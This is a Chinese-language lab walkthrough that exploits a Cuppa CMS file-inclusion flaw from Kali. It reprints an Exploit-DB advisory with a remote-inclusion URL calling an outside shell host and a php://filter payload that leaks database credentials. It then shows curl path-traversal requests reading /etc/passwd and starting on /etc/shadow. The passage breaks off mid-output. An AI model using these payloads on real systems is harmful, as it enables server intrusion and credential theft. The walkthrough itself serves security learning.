<h3 id="利用kali寻找cuppa-cms的漏洞"><a href="#利用kali寻找cuppa-cms的漏洞" class="headerlink" title="利用kali寻找cuppa cms的漏洞"></a>利用kali寻找cuppa cms的漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/../images$ searchsploit cuppa cms                                                                                            </span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                 |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion                                                                                                | php/webapps/25971.txt</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">                                                                                                                                                                                                 </span><br><span class="line">kali@kali:~/../images$ searchsploit cuppa cms -m 25971</span><br><span class="line">[!] Could not find EDB-ID #</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[!] Could not find EDB-ID #</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Exploit: Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/25971</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt</span><br><span class="line">    Codes: OSVDB-94101</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: C++ source, ASCII text, with very long lines (876)</span><br><span class="line">Copied to: /home/kali/../images/25971.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                                 </span><br><span class="line">kali@kali:~/../images$ ls</span><br><span class="line">01.txt  02.txt  03.txt  25971.txt  employee-names.txt  worktodo.txt</span><br><span class="line">                                                                                                                                                                                                 </span><br><span class="line">kali@kali:~/../images$ cat 25971.txt   </span><br><span class="line"># Exploit Title   : Cuppa CMS File Inclusion</span><br><span class="line"># Date            : 4 June 2013</span><br><span class="line"># Exploit Author  : CWH Underground</span><br><span class="line"># Site            : www.2600.in.th</span><br><span class="line"># Vendor Homepage : http://www.cuppacms.com/</span><br><span class="line"># Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip</span><br><span class="line"># Version         : Beta</span><br><span class="line"># Tested on       : Window and Linux</span><br><span class="line"></span><br><span class="line">  ,--^----------,--------,-----,-------^--,</span><br><span class="line">  | |||||||||   `--------&#x27;     |          O .. CWH Underground Hacking Team ..</span><br><span class="line">  `+---------------------------^----------|</span><br><span class="line">    `\_,-------, _________________________|</span><br><span class="line">      / XXXXXX /`|     /</span><br><span class="line">     / XXXXXX /  `\   /</span><br><span class="line">    / XXXXXX /\______(</span><br><span class="line">   / XXXXXX /</span><br><span class="line">  / XXXXXX /</span><br><span class="line"> (________(</span><br><span class="line">  `------&#x27;</span><br><span class="line"></span><br><span class="line">####################################</span><br><span class="line">VULNERABILITY: PHP CODE INJECTION</span><br><span class="line">####################################</span><br><span class="line"></span><br><span class="line">/alerts/alertConfigField.php (LINE: 22)</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">LINE 22:</span><br><span class="line">        &lt;?php include($_REQUEST[&quot;urlConfig&quot;]); ?&gt;</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#####################################################</span><br><span class="line">DESCRIPTION</span><br><span class="line">#####################################################</span><br><span class="line"></span><br><span class="line">An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.</span><br><span class="line"></span><br><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]</span><br><span class="line"></span><br><span class="line">#####################################################</span><br><span class="line">EXPLOIT</span><br><span class="line">#####################################################</span><br><span class="line"></span><br><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</span><br><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">Moreover, We could access Configuration.php source code via PHPStream</span><br><span class="line"></span><br><span class="line">For Example:</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Base64 Encode Output:</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Base64 Decode Output:</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">&lt;?php</span><br><span class="line">        class Configuration&#123;</span><br><span class="line">                public $host = &quot;localhost&quot;;</span><br><span class="line">                public $db = &quot;cuppa&quot;;</span><br><span class="line">                public $user = &quot;root&quot;;</span><br><span class="line">                public $password = &quot;Db@dmin&quot;;</span><br><span class="line">                public $table_prefix = &quot;cu_&quot;;</span><br><span class="line">                public $administrator_template = &quot;default&quot;;</span><br><span class="line">                public $list_limit = 25;</span><br><span class="line">                public $token = &quot;OBqIPqlFWf3X&quot;;</span><br><span class="line">                public $allowed_extensions = &quot;*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx&quot;;</span><br><span class="line">                public $upload_default_path = &quot;media/uploadsFiles&quot;;</span><br><span class="line">                public $maximum_file_size = &quot;5242880&quot;;</span><br><span class="line">                public $secure_login = 0;</span><br><span class="line">                public $secure_login_value = &quot;&quot;;</span><br><span class="line">                public $secure_login_redirect = &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Able to read sensitive information via File Inclusion (PHP Stream)</span><br><span class="line"></span><br><span class="line">################################################################################################################</span><br><span class="line"> Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2</span><br><span class="line">################################################################################################################               </span><br></pre></td></tr></table></figure>

<p>这是一个文件包含漏洞。</p>
<p>给了exp</p>
<p><img src="/../images/image-20221126153346338.png" alt="image-20221126153346338"></p>
<p>尝试访问，但是空白，没啥信息</p>
<p><img src="/../images/image-20221126153412177.png" alt="image-20221126153412177"></p>
<p>只显示我们显示给我们一个类似对话框的这样一个 web 组件。这个可能是什么原因呢？那第一有可能就是这条路走不通，那中间还有一些细节，这些事情我们在试过之后可能就能最终确定，那能不能走通。我们现在试一下，我们回想。或者是回看一下我们这个利用文件，我们能看到这里边涉及到有一个编码问题对吧？</p>
<p>我们可以借助一些工具</p>
<p>这里在kali中使用curl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">                                                                                        </span><br><span class="line">kali@kali:~/../images$ sudo curl --data-urlencode urlConfig=./../../../../../../../../etc/passwd http://192.168.19.177/administrator/alerts/alertConfigField.php            </span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .new_content&#123;</span><br><span class="line">        position: fixed;</span><br><span class="line">    &#125;</span><br><span class="line">    .alert_config_field&#123;</span><br><span class="line">        font-size:12px;</span><br><span class="line">        background:#FFF;</span><br><span class="line">        position:relative;</span><br><span class="line">        border-radius: 3px;</span><br><span class="line">        box-shadow: 0px 0px 5px rgba(0,0,0,0.2);</span><br><span class="line">        overflow:hidden;</span><br><span class="line">        position:fixed;</span><br><span class="line">        top:50%;</span><br><span class="line">        left:50%;</span><br><span class="line">        width:600px;</span><br><span class="line">        height:440px;</span><br><span class="line">        margin-left:-300px;</span><br><span class="line">        margin-top:-220px;</span><br><span class="line">    &#125;</span><br><span class="line">    .alert_config_top&#123;</span><br><span class="line">        position: relative;</span><br><span class="line">        margin: 2px;</span><br><span class="line">        margin-bottom: 0px;</span><br><span class="line">        border: 1px solid #D2D2D2;</span><br><span class="line">        background: #4489F8;</span><br><span class="line">        overflow: auto;</span><br><span class="line">        color:#FFF;</span><br><span class="line">        font-size: 13px;</span><br><span class="line">        padding: 7px 5px;</span><br><span class="line">        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);</span><br><span class="line">        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);</span><br><span class="line">    &#125;</span><br><span class="line">    .description_alert&#123;</span><br><span class="line">        position:relative;</span><br><span class="line">        font-size:12px;</span><br><span class="line">        text-shadow:0 1px #FFFFFF;</span><br><span class="line">        font-weight: normal;</span><br><span class="line">        padding: 5px 0px 5px 0px;</span><br><span class="line">    &#125;</span><br><span class="line">    .btnClose_alert&#123;</span><br><span class="line">        position:absolute;</span><br><span class="line">        top: 4px; right: 2px;</span><br><span class="line">        width:22px;</span><br><span class="line">        height:22px;</span><br><span class="line">        cursor:pointer;</span><br><span class="line">        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;</span><br><span class="line">        background-position: center;</span><br><span class="line">        background-size: 13px;</span><br><span class="line">    &#125;</span><br><span class="line">    .content_alert_config&#123;</span><br><span class="line">        position:relative;</span><br><span class="line">        clear:both;</span><br><span class="line">        margin: 2px;</span><br><span class="line">        margin-top: 0px;</span><br><span class="line">        height: 401px;</span><br><span class="line">        padding: 10px;</span><br><span class="line">        overflow: auto;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        function CloseDefaultAlert()&#123;</span><br><span class="line">                cuppa.setContent(&#123;&#x27;load&#x27;:false, duration:0.2&#125;);</span><br><span class="line">        cuppa.blockade(&#123;&#x27;load&#x27;:false, duration:0.2, delay:0.1&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div class=&quot;alert_config_field&quot; id=&quot;alert&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;alert_config_top&quot;&gt;</span><br><span class="line">        &lt;strong&gt;Configuration&lt;/strong&gt;:         &lt;div class=&quot;btnClose_alert&quot; id=&quot;btnClose_alert&quot; onclick=&quot;CloseDefaultAlert()&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;content_alert_config&quot; class=&quot;content_alert_config&quot;&gt;</span><br><span class="line">        root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">messagebus:x:106:110::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:107:111::/run/uuidd:/bin/false</span><br><span class="line">lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false</span><br><span class="line">whoopsie:x:109:117::/nonexistent:/bin/false</span><br><span class="line">avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false</span><br><span class="line">avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false</span><br><span class="line">hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false</span><br><span class="line">pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false</span><br><span class="line">rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false</span><br><span class="line">saned:x:119:127::/var/lib/saned:/bin/false</span><br><span class="line">usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false</span><br><span class="line">../images:x:1000:1000:../images,,,:/home/../images:/bin/bash</span><br><span class="line">sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false</span><br><span class="line">mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;                                                                                                                                                                                                 </span><br><span class="line">kali@kali:~/../images$ sudo curl --data-urlencode urlConfig=./../../../../../../../../etc/passwd http://192.168.19.177/administrator/alerts/alertConfigField.php | html2text</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  4413  100  4347  100    66   722k  11239 --:--:-- --:--:-- --:--:--  861k</span><br><span class="line">Configuration:</span><br><span class="line">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:</span><br><span class="line">x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/</span><br><span class="line">usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/</span><br><span class="line">var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/</span><br><span class="line">nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/</span><br><span class="line">var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:</span><br><span class="line">/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System</span><br><span class="line">(admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/</span><br><span class="line">nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time</span><br><span class="line">Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd</span><br><span class="line">Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:</span><br><span class="line">systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:</span><br><span class="line">105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/</span><br><span class="line">syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:</span><br><span class="line">110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false lightdm:x:</span><br><span class="line">108:114:Light Display Manager:/var/lib/lightdm:/bin/false whoopsie:x:109:117::/</span><br><span class="line">nonexistent:/bin/false avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/</span><br><span class="line">avahi-autoipd:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-</span><br><span class="line">daemon:/bin/false dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/</span><br><span class="line">bin/false hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:117:</span><br><span class="line">124:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:118:126:</span><br><span class="line">RealtimeKit,,,:/proc:/bin/false saned:x:119:127::/var/lib/saned:/bin/false</span><br><span class="line">usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false ../images:x:1000:1000:</span><br><span class="line">../images,,,:/home/../images:/bin/bash sshd:x:121:65534::/var/run/sshd:/usr/sbin/</span><br><span class="line">nologin ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false mysql:x:123:130:MySQL</span><br><span class="line">Server,,,:/nonexistent:/bin/false</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看shadow文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/../images$ sudo curl --data-urlencode urlConfig=./../../../../../../../../etc/shadow http://192.168.19.177/administrator/alerts/alertConfigField.php            </span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .new_content&#123;</span><br><span class="line">        position: fixed;</span><br><span class="line">    &#125;</span><br><span class="line">    .alert_config_field&#123;</span><br><span class="line">        font-size:12px;</span><br><span class="line">        background:#FFF;</span><br><span class="line">        position:relative;</span><br><span class="line">        border-radius: 3px;</span><br><span class="line">        box-shadow: 0px 0px 5px rgba(0,0,0,0.2);</span><br><span class="line">        overflow:hidden;</span><br><span class="line">        position:fixed;</span><br><span class="line">        top:50%;</span><br><span class="line">        left:50%;</span><br><span class="line">        width:600px;</span><br><span class="line">        height:440px;</span><br><span class="line">        margin-left:-300px;</span><br><span class="line">        margin-top:-220px;</span><br><span class="line">    &#125;</span><br><span class="line">    .alert_config_top&#123;</span><br><span class="line">        position: relative;</span><br><span class="line">        margin: 2px;</span><br><span class="line">        margin-bottom: 0px;</span><br><span class="line">        border: 1px solid #D2D2D2;</span><br><span class="line">        background: #4489F8;</span><br><span class="line">        overflow: auto;</span><br><span class="line">        color:#FFF;</span><br><span class="line">        font-size: 13px;</span><br><span class="line">        padding: 7px 5px;</span><br><span class="line">        box-shadow: 0 